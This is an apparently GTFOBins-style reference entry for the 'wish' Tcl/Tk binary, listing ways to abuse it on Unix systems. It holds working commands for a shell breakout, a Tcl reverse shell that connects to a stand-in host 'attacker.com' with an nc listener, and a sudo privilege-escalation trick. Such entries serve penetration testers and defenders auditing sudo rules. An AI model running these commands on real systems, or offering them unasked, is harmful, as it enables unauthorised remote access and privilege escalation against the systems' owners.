# GTFOBin: wish

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
wish
exec /bin/sh <@stdin >@stdout 2>@stderr
```

## Non-interactive reverse shell

It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr
```